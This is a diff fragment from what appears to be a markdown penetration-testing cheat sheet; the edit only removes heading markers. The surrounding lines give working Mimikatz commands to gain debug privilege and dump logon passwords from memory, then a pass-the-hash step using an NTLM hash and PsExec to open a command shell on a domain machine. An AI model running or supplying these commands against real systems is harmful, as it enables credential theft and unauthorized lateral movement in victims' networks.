@@ -31,13 +31,13 @@ sekurlsa::logonpasswords
 ```
 
 ### On Target Machine
-#### Extracting Passwords
+Extracting Passwords
 ```shell
 privilege:debug
 sekurlsa::logonPasswords
 ```
 
-#### Pass-the-Hash
+Pass-the-Hash
 ```powershell
 sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>  # Hash from previous password extraction
 PsExec.exe \\<domain> cmd.exe  # Spawn cmd prompt on given domain
